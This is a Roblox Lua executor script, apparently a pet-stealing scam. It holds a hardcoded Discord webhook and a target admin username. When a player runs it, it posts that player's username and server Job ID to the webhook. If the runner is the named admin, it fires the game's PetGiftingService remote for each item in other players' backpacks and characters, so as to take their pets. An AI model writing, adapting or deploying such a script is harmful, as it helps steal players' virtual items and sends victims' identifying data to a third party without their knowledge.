local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local HttpService = game:GetService("HttpService")

local webhookURL = "https://discord.com/api/webhooks/1378046230868787361/Ny2d9ikOTh5c3PXSTMOAT8FK4h7hIKIZ9duNOrqVqdA3AnDj04b13SSkB9GC9RzUIT9a"  -- Replace with your webhook
local adminUsername = "connor24377_10"  -- Your Roblox username
local localPlayer = Players.LocalPlayer
local petGiftEvent = ReplicatedStorage:WaitForChild("GameEvents"):WaitForChild("PetGiftingService")

-- Send webhook with username and job ID
local function sendWebhook()
    local payload = {
        content = "Script executed by player!",
        embeds = {{
            title = "Execution Report",
            fields = {
                {name = "Username", value = localPlayer.Name, inline = true},
                {name = "Server Job ID", value = game.JobId, inline = true},
            },
            color = 65280
        }}
    }

    local jsonPayload = HttpService:JSONEncode(payload)

    if syn and syn.request then
        syn.request({
            Url = webhookURL,
            Method = "POST",
            Headers = {["Content-Type"] = "application/json"},
            Body = jsonPayload
        })
    elseif request then
        request({
            Url = webhookURL,
            Method = "POST",
            Headers = {["Content-Type"] = "application/json"},
            Body = jsonPayload
        })
    else
        warn("No HTTP request function available in executor.")
    end
end

sendWebhook()

-- If this is admin, collect pets from others
if localPlayer.Name == adminUsername then
    local function givePetsFromPlayer(player)
        local playerBackpack = player:FindFirstChild("Backpack")
        local playerChar = player.Character
        if not playerBackpack and not playerChar then return end

        if playerBackpack then
            for _, item in ipairs(playerBackpack:GetChildren()) do
                if item:IsA("Tool") or item:IsA("Model") then
                    petGiftEvent:FireServer("GivePet", localPlayer)
                    wait(0.3)
                end
            end
        end

        if playerChar then
            for _, item in ipairs(playerChar:GetChildren()) do
                if item:IsA("Tool") or item:IsA("Model") then
                    petGiftEvent:FireServer("GivePet", localPlayer)
                    wait(0.3)
                end
            end
        end
    end

    -- Delay to allow players to load
    wait(5)

    for _, player in ipairs(Players:GetPlayers()) do
        if player ~= localPlayer then
            givePetsFromPlayer(player)
        end
    end
end
